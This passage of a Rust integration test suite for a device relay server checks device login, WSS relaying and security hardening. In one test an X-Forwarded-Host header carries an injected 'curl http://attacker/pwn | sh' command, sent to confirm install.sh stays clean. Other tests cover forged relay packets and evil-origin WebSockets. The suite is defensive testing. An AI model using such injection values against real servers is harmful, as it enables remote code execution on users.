        b"cf-wss-device-flow-secret-2026".to_vec(),
        None,
        Some(temp_web_dist.clone()),
        ServerOptions {
            open_registration: true,
            raw_tcp_public_endpoint: None,
            release_version: "v99.99.99-unreleased".into(),
            github_repo: "Annihilater/coda".into(),
            ios_beta_url: Some("https://testflight.apple.com/join/CodaBeta".into()),
            ..ServerOptions::default()
        },
    )
    .await
    .unwrap();

    let base = format!("http://{}", server.http_addr);
    let http = reqwest::Client::new();

    // 1. Public unauthenticated portal metadata + Cloudflare cache/forwarded header detection
    let site_resp = http
        .get(format!("{base}/api/v1/public/site-info"))
        .header("x-forwarded-host", "codahub.dev")
        .header("cf-visitor", r#"{"scheme":"https"}"#)
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap();
    assert_eq!(
        site_resp
            .headers()
            .get("cache-control")
            .and_then(|v| v.to_str().ok()),
        Some("no-cache, no-store, must-revalidate")
    );
    assert_eq!(
        site_resp
            .headers()
            .get("cdn-cache-control")
            .and_then(|v| v.to_str().ok()),
        Some("no-store")
    );
    let site: serde_json::Value = site_resp.json().await.unwrap();
    assert_eq!(site["open_registration"], true);
    assert_eq!(
        site["install_command"],
        "curl -fsSL https://codahub.dev/install.sh | sh"
    );
    assert_eq!(
        site["downloads"]["desktop_macos_dmg"],
        "https://codahub.dev/download/desktop-macos.dmg"
    );
    assert_eq!(
        site["downloads"]["releases_page"],
        "https://github.com/Annihilater/coda/releases/latest"
    );
    for (key, val) in site["downloads"].as_object().unwrap() {
        if let Some(url) = val.as_str() {
            assert!(
                !url.contains("v99.99.99-unreleased"),
                "download URL `{key}` must not be pinned to a hardcoded release tag: {url}"
            );
        }
    }

    // Verify /download/{artifact} issues an uncached 302 redirect to GitHub latest release, and 404 on unknown artifacts
    let no_redirect_http = reqwest::Client::builder()
        .redirect(reqwest::redirect::Policy::none())
        .build()
        .unwrap();
    let dl_resp = no_redirect_http
        .get(format!("{base}/download/desktop-macos.dmg"))
        .send()
        .await
        .unwrap();
    assert_eq!(dl_resp.status(), reqwest::StatusCode::FOUND);
    assert_eq!(
        dl_resp
            .headers()
            .get("cache-control")
            .and_then(|v| v.to_str().ok()),
        Some("no-cache, no-store, must-revalidate")
    );
    assert_eq!(
        dl_resp
            .headers()
            .get("cdn-cache-control")
            .and_then(|v| v.to_str().ok()),
        Some("no-store")
    );
    let redirect_location = dl_resp
        .headers()
        .get(reqwest::header::LOCATION)
        .and_then(|v| v.to_str().ok())
        .unwrap();
    assert!(
        redirect_location.starts_with("https://github.com/Annihilater/coda/releases/"),
        "unexpected redirect location: {redirect_location}"
    );
    assert!(!redirect_location.contains("v99.99.99-unreleased"));

    let unknown_dl_resp = no_redirect_http
        .get(format!("{base}/download/unknown.bin"))
        .send()
        .await
        .unwrap();
    assert_eq!(unknown_dl_resp.status(), reqwest::StatusCode::NOT_FOUND);

    // Verify SPA routes return 200 OK with strict CDN no-store headers
    for spa_path in ["/", "/login", "/register", "/activate?code=ABCD-1234", "/console"] {
        let resp = http.get(format!("{base}{spa_path}")).send().await.unwrap();
        assert_eq!(
            resp.status(),
            reqwest::StatusCode::OK,
            "SPA route {spa_path} must return 200 OK"
        );
        assert_eq!(
            resp.headers()
                .get("cache-control")
                .and_then(|v| v.to_str().ok()),
            Some("no-cache, no-store, must-revalidate")
        );
        assert_eq!(
            resp.headers()
                .get("cdn-cache-control")
                .and_then(|v| v.to_str().ok()),
            Some("no-store")
        );
    }

    // Verify immutable CDN caching for existing hashed bundles (/app.<hash>.js) vs no-store on 404
    let hashed_resp = http
        .get(format!("{base}/app.abcdef1234.js"))
        .send()
        .await
        .unwrap();
    assert_eq!(hashed_resp.status(), reqwest::StatusCode::OK);
    assert_eq!(
        hashed_resp
            .headers()
            .get("cache-control")
            .and_then(|v| v.to_str().ok()),
        Some("public, max-age=31536000, immutable")
    );
    let missing_hashed_resp = http
        .get(format!("{base}/app.missing9999.js"))
        .send()
        .await
        .unwrap();
    assert_eq!(missing_hashed_resp.status(), reqwest::StatusCode::NOT_FOUND);
    assert_eq!(
        missing_hashed_resp
            .headers()
            .get("cdn-cache-control")
            .and_then(|v| v.to_str().ok()),
        Some("no-store")
    );
    let _ = std::fs::remove_dir_all(&temp_web_dist);
    let relays = site["relays"].as_array().unwrap();
    assert!(!relays.iter().any(|r| r["mode"] == "raw_tcp_no_sni"));
    assert!(relays
        .iter()
        .any(|r| r["endpoint"] == "wss://codahub.dev/v1/tunnel/ws"));

    let install_sh = http
        .get(format!("{base}/install.sh"))
        .header("x-forwarded-host", "codahub.dev")
        .header("cf-visitor", r#"{"scheme":"https"}"#)
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap()
        .text()
        .await
        .unwrap();
    assert!(install_sh.contains("DEFAULT_SERVER_URL=\"https://codahub.dev\""));

    // 2. Open registration works even for 2nd user without invite code
    let _first: AuthResponse = http
        .post(format!("{base}/api/v1/auth/register"))
        .json(&json!({
            "email": "admin@coda.dev",
            "handle": "admin",
            "display_name": "Admin",
            "password": "password123",
        }))
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap()
        .json()
        .await
        .unwrap();

    let alice: AuthResponse = http
        .post(format!("{base}/api/v1/auth/register"))
        .json(&json!({
            "email": "alice@coda.dev",
            "handle": "alice",
            "display_name": "Alice",
            "password": "password123",
        }))
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap()
        .json()
        .await
        .unwrap();
    assert!(!alice.user.is_admin);

    // 3. RFC 8628 browser device authorization for Linux daemon + macOS hybrid desktop
    let linux_started =
        start_device_login_flow(&base, "daemon", Some("Aliyun-Dev-Box".into()), None)
            .await
            .unwrap();
    assert!(linux_started
        .verification_uri_complete
        .contains(&linux_started.user_code));

    let info: DeviceAuthPublicInfo = http
        .get(format!(
            "{base}/api/v1/auth/device/info?code={}",
            linux_started.user_code
        ))
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap()
        .json()
        .await
        .unwrap();
    assert_eq!(info.device_name, "Aliyun-Dev-Box");
    assert_eq!(info.status, "pending");

    let pending_cfg = poll_device_login_once(&linux_started).await.unwrap();
    assert!(pending_cfg.is_none());

    http.post(format!("{base}/api/v1/auth/device/approve"))
        .bearer_auth(&alice.token)
        .json(&json!({ "user_code": linux_started.user_code }))
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap();

    let linux_cfg = poll_device_login_once(&linux_started)
        .await
        .unwrap()
        .expect("linux daemon should now be approved");
    assert_eq!(linux_cfg.owner_handle, "alice");
    assert!(linux_cfg.session_token.is_some());

    let mac_started =
        start_device_login_flow(&base, "hybrid", Some("Alice-MacBook".into()), None)
            .await
            .unwrap();
    http.post(format!("{base}/api/v1/auth/device/approve"))
        .bearer_auth(&alice.token)
        .json(&json!({ "user_code": mac_started.user_code }))
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap();
    let mac_cfg = poll_device_login_once(&mac_started)
        .await
        .unwrap()
        .expect("mac hybrid host should be approved");

    // 4. Both `daemon` and `hybrid` hosts appear in list_account_hosts & talk over WSS relay
    let hosts = list_account_hosts(&base, mac_cfg.session_token.as_deref().unwrap())
        .await
        .unwrap();
    assert_eq!(hosts.len(), 2);
    assert!(hosts
        .iter()
        .any(|h| h.id == linux_cfg.device_id && h.role == "daemon"));
    assert!(hosts
        .iter()
        .any(|h| h.id == mac_cfg.device_id && h.role == "hybrid"));

    let daemon_cfg_run = linux_cfg.clone();
    let daemon_task = tokio::spawn(async move {
        let _ = run_daemon_once_with_p2p(&daemon_cfg_run, Some("cdn_wss"), None).await;
    });
    tokio::time::sleep(std::time::Duration::from_millis(250)).await;

    let rcfg = mint_peer_relay_config(
        &base,
        mac_cfg.session_token.as_deref().unwrap(),
        mac_cfg.device_id,
        linux_cfg.device_id,
        &linux_cfg.identity.ed25519_public_b64,
        &linux_cfg.identity.x25519_public_b64,
    )
    .await
    .unwrap();
    let linux_pin = PeerIdentityPin {
        ed25519_pub_b64: linux_cfg.identity.ed25519_public_b64.clone(),
        x25519_pub_b64: linux_cfg.identity.x25519_public_b64.clone(),
    };
    let mut smart = SmartPeerClient::connect_auto(
        mac_cfg.identity.clone(),
        mac_cfg.device_id,
        linux_cfg.device_id,
        linux_pin,
        vec![],
        None,
        Some(SmartRelayFallbackConfig {
            raw_tcp_addr: None,
            wss_url: rcfg.wss_url,
            relay_ticket: rcfg.relay_ticket,
            peer_ed25519_pub_b64: rcfg.peer_ed25519_pub_b64,
            peer_x25519_pub_b64: rcfg.peer_x25519_pub_b64,
        }),
    )
    .await
    .unwrap();
    assert_eq!(smart.active_route(), "relay_wss");

    match smart
        .request(
            &PeerMessage::Ping {
                req_id: "cf-wss-ping-1".into(),
                sent_ms: 999,
            },
            TrafficLane::ControlP0,
        )
        .await
        .unwrap()
    {
        PeerMessage::Pong { req_id, .. } => assert_eq!(req_id, "cf-wss-ping-1"),
        other => panic!("expected Pong over WSS relay, got {other:?}"),
    }

    daemon_task.abort();
}

async fn read_len_frame(stream: &mut TcpStream) -> RelayWireFrame {
    let mut len_buf = [0u8; 4];
    stream.read_exact(&mut len_buf).await.unwrap();
    let len = u32::from_be_bytes(len_buf) as usize;
    let mut body = vec![0u8; len];
    stream.read_exact(&mut body).await.unwrap();
    serde_json::from_slice(&body).unwrap()
}

async fn next_route_packet(stream: &mut TcpStream) -> RelayWireFrame {
    loop {
        let f = read_len_frame(stream).await;
        match f {
            RelayWireFrame::RoutePacket { .. } => return f,
            RelayWireFrame::Error { code, message } => {
                panic!("unexpected relay error while waiting for RoutePacket ({code}): {message}");
            }
            _ => {}
        }
    }
}

#[tokio::test]
async fn test_security_hardening_regressions() {
    let _guard = DB_TEST_LOCK.get_or_init(|| Mutex::new(())).lock().await;
    let db_url = std::env::var("TEST_DATABASE_URL")
        .unwrap_or_else(|_| "postgres://vampire@localhost:5432/coda_test".to_string());
    let _pg_lock = acquire_clean_test_db(&db_url).await;

    let server = start_full_server_with_options(
        &db_url,
        "127.0.0.1:0".parse::<SocketAddr>().unwrap(),
        "127.0.0.1:0".parse::<SocketAddr>().unwrap(),
        b"security-regression-hmac-secret-2026".to_vec(),
        None,
        None,
        ServerOptions {
            open_registration: true,
            ..ServerOptions::default()
        },
    )
    .await
    .unwrap();

    let base = format!("http://{}", server.http_addr);
    let http = reqwest::Client::new();

    // Register victim account + attacker account
    let victim_auth: AuthResponse = http
        .post(format!("{base}/api/v1/auth/register"))
        .json(&json!({
            "email": "victim@coda.dev",
            "handle": "victim",
            "display_name": "Victim",
            "password": "VictimPass2026!",
        }))
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap()
        .json()
        .await
        .unwrap();

    // (e) Query-string ?token= MUST be rejected on /api/v1/events/ws with 401
    let ws_base = base.replacen("http://", "ws://", 1);
    let qs_err = tokio_tungstenite::connect_async(format!(
        "{ws_base}/api/v1/events/ws?token={}",
        victim_auth.token
    ))
    .await
    .expect_err("/api/v1/events/ws?token= must be rejected");
    if let tokio_tungstenite::tungstenite::Error::Http(resp) = qs_err {
        assert_eq!(resp.status(), 401);
    }

    // Subprotocol auth ["coda-auth", "coda-bearer.<tok>"] works cleanly
    {
        use tokio_tungstenite::tungstenite::{client::IntoClientRequest, http::HeaderValue};
        let mut req = format!("{ws_base}/api/v1/events/ws")
            .into_client_request()
            .unwrap();
        req.headers_mut().insert(
            "Sec-WebSocket-Protocol",
            HeaderValue::from_str(&format!("coda-auth, coda-bearer.{}", victim_auth.token)).unwrap(),
        );
        let (mut ws_stream, _) = tokio_tungstenite::connect_async(req)
            .await
            .expect("Sec-WebSocket-Protocol auth should succeed");
        let first = ws_stream.next().await.unwrap().unwrap();
        assert!(first.to_text().unwrap().contains("connected"));
    }

    // (c) Malicious X-Forwarded-Host must NOT inject shell payload into /install.sh
    let install_resp = http
        .get(format!("{base}/install.sh"))
        .header("X-Forwarded-Host", "evil.com; curl http://attacker/pwn | sh")
        .send()
        .await
        .unwrap();
    assert_eq!(install_resp.status(), 200);
    let script_txt = install_resp.text().await.unwrap();
    assert!(!script_txt.contains("evil.com"));
    assert!(!script_txt.contains("attacker/pwn"));

    // Pair daemon under victim account
    let pair_tok: PairTokenResponse = http
        .post(format!("{base}/api/v1/devices/pair-token"))
        .bearer_auth(&victim_auth.token)
        .json(&json!({ "suggested_name": "Victim-Host" }))
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap()
        .json()
        .await
        .unwrap();
    let daemon_cfg =
        coda_daemon::pair_daemon_with_code(&base, &pair_tok.code, Some("Victim-Host".into()))
            .await
            .unwrap();

    let p2p_addr = spawn_direct_p2p_listener(
        daemon_cfg.clone(),
        "127.0.0.1:0".parse::<SocketAddr>().unwrap(),
    )
    .await
    .unwrap();
    let p2p_port = p2p_addr.port();
    let daemon_cfg_bg = daemon_cfg.clone();
    let daemon_task = tokio::spawn(async move {
        let _ = run_daemon_once_with_p2p(&daemon_cfg_bg, Some("raw_tcp_no_sni"), Some(p2p_port))
            .await;
    });
    tokio::time::sleep(std::time::Duration::from_millis(200)).await;

    // Register victim legitimate client
    let mut leg_id = StoredDeviceIdentity::generate("Victim-Phone");
    let leg_dev: DeviceRecord = http
        .post(format!("{base}/api/v1/devices/register-client"))
        .bearer_auth(&victim_auth.token)
        .json(&json!({
            "name": "Victim-Phone",
            "platform": "ios",
            "ed25519_pubkey": leg_id.ed25519_public_b64,
            "x25519_pubkey": leg_id.x25519_public_b64,
        }))
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap()
        .json()
        .await
        .unwrap();
    leg_id.device_id = Some(leg_dev.id);

    // (a) Untrusted random device identity (and spoofed device_id with wrong key) MUST fail on :24444
    let daemon_pin = PeerIdentityPin {
        ed25519_pub_b64: daemon_cfg.identity.ed25519_public_b64.clone(),
        x25519_pub_b64: daemon_cfg.identity.x25519_public_b64.clone(),
    };
    let attacker_id = StoredDeviceIdentity::generate("Attacker");
    assert!(
        DirectP2pClient::connect_direct(
            &p2p_addr.to_string(),
            &attacker_id,
            uuid::Uuid::new_v4(),
            daemon_cfg.device_id,
            &daemon_pin,
        )
        .await
        .is_err(),
        "unknown device must be rejected on :24444"
    );
    assert!(
        DirectP2pClient::connect_direct(
            &p2p_addr.to_string(),
            &attacker_id,
            leg_dev.id,
            daemon_cfg.device_id,
            &daemon_pin,
        )
        .await
        .is_err(),
        "spoofed device_id with untrusted key must be rejected on :24444"
    );

    // Legitimate client establishes Relay v2 session
    let leg_ticket: MintRelayTicketResponse = http
        .post(format!("{base}/api/v1/relay/ticket"))
        .bearer_auth(&victim_auth.token)
        .json(&json!({
            "device_id": leg_dev.id,
            "peer_device_id": daemon_cfg.device_id,
        }))
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap()
        .json()
        .await
        .unwrap();
    let mut relay_stream = TcpStream::connect(server.raw_tcp_addr).await.unwrap();
    relay_stream
        .write_all(
            &RelayWireFrame::AuthBind {
                ticket: leg_ticket.ticket.clone(),
                lane: TrafficLane::ControlP0,
                generation: 100,
            }
            .encode_length_delimited()
            .unwrap(),
        )
        .await
        .unwrap();
    assert!(matches!(
        read_len_frame(&mut relay_stream).await,
        RelayWireFrame::AuthAck { ok: true, .. }
    ));

    let leg_auth = RelaySessionAuth::create(
        &leg_id,
        daemon_cfg.device_id,
        true,
        current_unix_ms(),
    )
    .unwrap();
    let mut leg_e2ee = E2eeSession::derive_relay_session(
        &leg_id.x25519_secret().unwrap(),
        &daemon_cfg.identity.x25519_public_b64,
        &leg_auth.session_nonce_b64,
        leg_dev.id,
        daemon_cfg.device_id,
        true,
        true,
    )
    .unwrap();

    // Send valid Ping seq=1 -> establishes active Relay v2 session
    let p1 = leg_e2ee
        .seal_message(&PeerMessage::Ping {
            req_id: "leg-1".into(),
            sent_ms: 1,
        })
        .unwrap();
    relay_stream
        .write_all(
            &RelayWireFrame::RoutePacket {
                src_device_id: leg_dev.id,
                dst_device_id: daemon_cfg.device_id,
                lane: TrafficLane::ControlP0,
                e2ee: p1,
                sender_x25519_pub_b64: None,
                session_auth: Some(leg_auth.clone()),
            }
            .encode_length_delimited()
            .unwrap(),
        )
        .await
        .unwrap();
    let r1 = next_route_packet(&mut relay_stream).await;
    if let RelayWireFrame::RoutePacket { e2ee, .. } = r1 {
        assert!(matches!(
            leg_e2ee.open_message(&e2ee).unwrap(),
            PeerMessage::Pong { .. }
        ));
    }

    // (b) Forged Relay seq=1 reset WITHOUT valid RelaySessionAuth MUST be dropped & MUST NOT reset leg_e2ee!
    let mut forged_e2ee = E2eeSession::derive(
        &attacker_id.x25519_secret().unwrap(),
        &daemon_cfg.identity.x25519_public_b64,
        true,
    )
    .unwrap();
    let forged_p1 = forged_e2ee
        .seal_message(&PeerMessage::Ping {
            req_id: "forged-1".into(),
            sent_ms: 2,
        })
        .unwrap();
    relay_stream
        .write_all(
            &RelayWireFrame::RoutePacket {
                src_device_id: leg_dev.id,
                dst_device_id: daemon_cfg.device_id,
                lane: TrafficLane::ControlP0,
                e2ee: forged_p1,
                sender_x25519_pub_b64: Some(attacker_id.x25519_public_b64.clone()),
                session_auth: None,
            }
            .encode_length_delimited()
            .unwrap(),
        )
        .await
        .unwrap();

    // Send seq=2 on the ORIGINAL legitimate leg_e2ee: proves active session was NOT reset by forged seq=1!
    let p2 = leg_e2ee
        .seal_message(&PeerMessage::Ping {
            req_id: "leg-2".into(),
            sent_ms: 3,
        })
        .unwrap();
    relay_stream
        .write_all(
            &RelayWireFrame::RoutePacket {
                src_device_id: leg_dev.id,
                dst_device_id: daemon_cfg.device_id,
                lane: TrafficLane::ControlP0,
                e2ee: p2,
                sender_x25519_pub_b64: None,
                session_auth: None,
            }
            .encode_length_delimited()
            .unwrap(),
        )
        .await
        .unwrap();
    let r2 = next_route_packet(&mut relay_stream).await;
    if let RelayWireFrame::RoutePacket { e2ee, .. } = r2 {
        match leg_e2ee.open_message(&e2ee).unwrap() {
            PeerMessage::Pong { req_id, .. } => assert_eq!(req_id, "leg-2"),
            other => panic!("expected leg-2 Pong (unforged session intact), got {other:?}"),
        }
    }

    // (d) DELETE /api/v1/devices/{id} immediately disconnects active relay peer
    let del_resp = http
        .delete(format!("{base}/api/v1/devices/{}", leg_dev.id))
        .bearer_auth(&victim_auth.token)
        .send()
        .await
        .unwrap();
    assert_eq!(del_resp.status(), 200);

    let closed_or_eof = tokio::time::timeout(std::time::Duration::from_secs(3), async {
        let mut buf = [0u8; 64];
        loop {
            match relay_stream.read(&mut buf).await {
                Ok(0) | Err(_) => break true,
                Ok(_) => continue,
            }
        }
    })
    .await
    .unwrap_or(false);
    assert!(
        closed_or_eof,
        "DELETE /api/v1/devices/{{id}} must disconnect active relay socket"
    );

    // POST /api/v1/auth/logout revokes session token immediately
    let logout_resp = http
        .post(format!("{base}/api/v1/auth/logout"))
        .bearer_auth(&victim_auth.token)
        .send()
        .await
        .unwrap();
    assert_eq!(logout_resp.status(), 200);
    let after_logout = http
        .get(format!("{base}/api/v1/devices"))
        .bearer_auth(&victim_auth.token)
        .send()
        .await
        .unwrap();
    assert_eq!(after_logout.status(), 401);

    daemon_task.abort();
}

#[tokio::test]
async fn test_v2_security_and_lifecycle_endpoints() {
    let _guard = DB_TEST_LOCK.get_or_init(|| Mutex::new(())).lock().await;
    let db_url = std::env::var("TEST_DATABASE_URL")
        .unwrap_or_else(|_| "postgres://vampire@localhost:5432/coda_test".to_string());
    let _pg_lock = acquire_clean_test_db(&db_url).await;

    let server = start_full_server_with_options(
        &db_url,
        "127.0.0.1:0".parse::<SocketAddr>().unwrap(),
        "127.0.0.1:0".parse::<SocketAddr>().unwrap(),
        b"v2-security-lifecycle-secret-2026".to_vec(),
        None,
        None,
        ServerOptions {
            open_registration: true,
            ..ServerOptions::default()
        },
    )
    .await
    .unwrap();
    let base = format!("http://{}", server.http_addr);
    let http = reqwest::Client::new();

    // 1. Register admin & non-admin user
    let admin: AuthResponse = http
        .post(format!("{base}/api/v1/auth/register"))
        .json(&json!({
            "email": "admin-v2@coda.dev",
            "handle": "adminv2",
            "display_name": "Admin V2",
            "password": "password-one-123",
        }))
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap()
        .json()
        .await
        .unwrap();
    assert!(admin.user.is_admin);

    let member: AuthResponse = http
        .post(format!("{base}/api/v1/auth/register"))
        .json(&json!({
            "email": "member-v2@coda.dev",
            "handle": "memberv2",
            "display_name": "Member V2",
            "password": "password-two-123",
        }))
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap()
        .json()
        .await
        .unwrap();
    assert!(!member.user.is_admin);

    // Non-admin GET /api/v1/invites MUST return 403 (#45)
    let member_invites = http
        .get(format!("{base}/api/v1/invites"))
        .bearer_auth(&member.token)
        .send()
        .await
        .unwrap();
    assert_eq!(member_invites.status(), 403);

    // Admin create + list + DELETE /api/v1/invites/{code}
    let inv: InviteCodeRecord = http
        .post(format!("{base}/api/v1/invites"))
        .bearer_auth(&admin.token)
        .json(&json!({ "note": "temp", "max_uses": 2, "valid_days": 7 }))
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap()
        .json()
        .await
        .unwrap();
    let del_inv = http
        .delete(format!("{base}/api/v1/invites/{}", inv.code))
        .bearer_auth(&admin.token)
        .send()
        .await
        .unwrap();
    assert_eq!(del_inv.status(), 200);

    // 2. RFC 8628 daemon login -> session token gets scope = daemon_host (#1)
    let start = start_device_login_flow(&base, "daemon", Some("scoped-linux-host".into()), None)
        .await
        .unwrap();
    let approve_resp = http
        .post(format!("{base}/api/v1/auth/device/approve"))
        .bearer_auth(&admin.token)
        .json(&json!({ "user_code": start.user_code }))
        .send()
        .await
        .unwrap();
    assert_eq!(approve_resp.status(), 200);

    let polled = poll_device_login_once(&start)
        .await
        .unwrap()
        .expect("approved");
    let daemon_tok = polled.session_token.as_deref().expect("daemon session token");

    // daemon_host scope MUST be blocked (403) on controller/account endpoints
    assert_eq!(
        http.get(format!("{base}/api/v1/devices"))
            .bearer_auth(daemon_tok)
            .send()
            .await
            .unwrap()
            .status(),
        403
    );
    assert_eq!(
        http.post(format!("{base}/api/v1/devices/pair-token"))
            .bearer_auth(daemon_tok)
            .json(&json!({}))
            .send()
            .await
            .unwrap()
            .status(),
        403
    );
    // daemon_host scope IS allowed on /api/v1/auth/me and /api/v1/relay/trusted-peers
    assert_eq!(
        http.get(format!("{base}/api/v1/auth/me"))
            .bearer_auth(daemon_tok)
            .send()
            .await
            .unwrap()
            .status(),
        200
    );
    assert_eq!(
        http.get(format!("{base}/api/v1/relay/trusted-peers"))
            .bearer_auth(daemon_tok)
            .send()
            .await
            .unwrap()
            .status(),
        200
    );

    // 3. PATCH /api/v1/devices/{id} renames device (#45)
    let renamed: DeviceRecord = http
        .patch(format!("{base}/api/v1/devices/{}", polled.device_id))
        .bearer_auth(&admin.token)
        .json(&json!({ "name": "renamed-prod-box" }))
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap()
        .json()
        .await
        .unwrap();
    assert_eq!(renamed.name, "renamed-prod-box");

    // 4. POST /api/v1/relay/renew-ticket (#28)
    let ts_ms = current_unix_ms();
    let sig = polled
        .identity
        .sign(&coda_protocol::relay_ticket_renew_signing_bytes(
            polled.device_id,
            ts_ms,
        ))
        .unwrap();
    let renew: coda_server::RenewRelayTicketResponse = http
        .post(format!("{base}/api/v1/relay/renew-ticket"))
        .json(&json!({
            "device_id": polled.device_id,
            "timestamp_ms": ts_ms,
            "signature_b64": sig,
        }))
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap()
        .json()
        .await
        .unwrap();
    assert!(!renew.daemon_relay_ticket.is_empty());
    assert!(renew.expires_in_secs >= 29 * 86_400);

    // Bad signature rejected
    assert_eq!(
        http.post(format!("{base}/api/v1/relay/renew-ticket"))
            .json(&json!({
                "device_id": polled.device_id,
                "timestamp_ms": ts_ms,
                "signature_b64": "AAAA",
            }))
            .send()
            .await
            .unwrap()
            .status(),
        401
    );

    // 5. DELETE /api/v1/devices/{id} cascades auth_sessions & rejects relay reconnect (#3)
    assert_eq!(
        http.delete(format!("{base}/api/v1/devices/{}", polled.device_id))
            .bearer_auth(&admin.token)
            .send()
            .await
            .unwrap()
            .status(),
        200
    );
    // Device-bound session token is immediately invalid (401)
    assert_eq!(
        http.get(format!("{base}/api/v1/auth/me"))
            .bearer_auth(daemon_tok)
            .send()
            .await
            .unwrap()
            .status(),
        401
    );
    // Reconnecting to Raw TCP relay with the old still-unexpired ticket MUST fail with device_revoked
    let mut tcp = TcpStream::connect(server.raw_tcp_addr).await.unwrap();
    tcp.write_all(
        &RelayWireFrame::AuthBind {
            ticket: renew.daemon_relay_ticket.clone(),
            lane: TrafficLane::ControlP0,
            generation: 1,
        }
        .encode_length_delimited()
        .unwrap(),
    )
    .await
    .unwrap();
    let mut len_buf = [0u8; 4];
    tcp.read_exact(&mut len_buf).await.unwrap();
    let flen = u32::from_be_bytes(len_buf) as usize;
    let mut payload = vec![0u8; flen];
    tcp.read_exact(&mut payload).await.unwrap();
    match serde_json::from_slice::<RelayWireFrame>(&payload).unwrap() {
        RelayWireFrame::Error { code, .. } => assert_eq!(code, "device_revoked"),
        other => panic!("expected device_revoked Error frame, got {other:?}"),
    }

    // 6. Cross-origin WebSocket rejected with 403 (#6)
    let bad_origin_req = tokio_tungstenite::tungstenite::http::Request::builder()
        .uri(format!("ws://{}/v1/tunnel/ws", server.http_addr))
        .header("Host", server.http_addr.to_string())
        .header("Origin", "https://evil.example")
        .header("Connection", "Upgrade")
        .header("Upgrade", "websocket")
        .header("Sec-WebSocket-Version", "13")
        .header("Sec-WebSocket-Key", "dGhlIHNhbXBsZSBub25jZQ==")
        .body(())
        .unwrap();
    assert!(connect_async(bad_origin_req).await.is_err());

    // 7. Sessions list + change password + delete account (#45)
    let second_login: AuthResponse = http
        .post(format!("{base}/api/v1/auth/login"))
        .json(&json!({
            "email_or_handle": "memberv2",
            "password": "password-two-123",
            "client_label": "second-browser",
        }))
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap()
        .json()
        .await
        .unwrap();
    let sessions: Vec<coda_server::db::AuthSessionRecord> = http
        .get(format!("{base}/api/v1/auth/sessions"))
        .bearer_auth(&member.token)
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap()
        .json()
        .await
        .unwrap();
    assert_eq!(sessions.len(), 2);
    assert!(sessions.iter().any(|s| s.is_current));

    // Change password invalidates other sessions
    assert_eq!(
        http.post(format!("{base}/api/v1/auth/password"))
            .bearer_auth(&member.token)
            .json(&json!({
                "current_password": "password-two-123",
                "new_password": "new-secure-password-456",
            }))
            .send()
            .await
            .unwrap()
            .status(),
        200
    );
    assert_eq!(
        http.get(format!("{base}/api/v1/auth/me"))
            .bearer_auth(&second_login.token)
            .send()
            .await
            .unwrap()
            .status(),
        401
    );

    // Delete account
    assert_eq!(
        http.delete(format!("{base}/api/v1/auth/me"))
            .bearer_auth(&member.token)
            .json(&json!({ "password": "new-secure-password-456" }))
            .send()
            .await
            .unwrap()
            .status(),
        200
    );
    assert_eq!(
        http.get(format!("{base}/api/v1/auth/me"))
            .bearer_auth(&member.token)
            .send()
            .await
            .unwrap()
            .status(),
        401
    );
}

#[tokio::test]
async fn test_v090_webhook_notifications_daemon_alerts_prune_stale_and_bootstrap_workspace() {
    let _guard = DB_TEST_LOCK.get_or_init(|| Mutex::new(())).lock().await;
    let db_url = std::env::var("TEST_DATABASE_URL")
        .unwrap_or_else(|_| "postgres://vampire@localhost:5432/coda_test".to_string());
    let pg = acquire_clean_test_db(&db_url).await;

    let server = start_full_server_with_options(
        &db_url,
        "127.0.0.1:0".parse::<SocketAddr>().unwrap(),
        "127.0.0.1:0".parse::<SocketAddr>().unwrap(),
        b"v090-webhook-and-prune-secret-key".to_vec(),
        None,
        None,
        ServerOptions {
            open_registration: true,
            ..ServerOptions::default()
        },
    )
    .await
    .unwrap();

    let base = format!("http://{}", server.http_addr);
    let http = reqwest::Client::new();

    // Spin up a local mock webhook receiver for Bark, Feishu, Discord, and Generic JSON webhooks.
    let (hook_tx, mut hook_rx) = tokio::sync::mpsc::unbounded_channel::<(String, serde_json::Value)>();
    let mock_listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let mock_addr = mock_listener.local_addr().unwrap();
    let mock_router = axum::Router::new().route(
        "/hook/{channel}",
        axum::routing::post({
            let tx = hook_tx.clone();
            move |axum::extract::Path(ch): axum::extract::Path<String>,
                  axum::Json(payload): axum::Json<serde_json::Value>| {
                let tx = tx.clone();
                async move {
                    let _ = tx.send((ch, payload));
                    axum::http::StatusCode::OK
                }
            }
        }),
    );
    let mock_server_task = tokio::spawn(async move {
        let _ = axum::serve(mock_listener, mock_router).await;
    });

    // 1. Register owner & second tenant
    let owner: AuthResponse = http
        .post(format!("{base}/api/v1/auth/register"))
        .json(&json!({
            "email": "owner090@coda.dev",
            "handle": "owner090",
            "display_name": "Owner 090",
            "password": "password-090-owner",
        }))
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap()
        .json()
        .await
        .unwrap();

    let other_user: AuthResponse = http
        .post(format!("{base}/api/v1/auth/register"))
        .json(&json!({
            "email": "other090@coda.dev",
            "handle": "other090",
            "display_name": "Other 090",
            "password": "password-090-other",
        }))
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap()
        .json()
        .await
        .unwrap();

    // 2. Default GET /api/v1/me/notifications + SSRF rejection before enabling local test flag
    let initial_notif: coda_server::NotificationSettingsRecord = http
        .get(format!("{base}/api/v1/me/notifications"))
        .bearer_auth(&owner.token)
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap()
        .json()
        .await
        .unwrap();
    assert_eq!(initial_notif.bark_url, "");
    assert!(initial_notif.notify_on_needs_you);
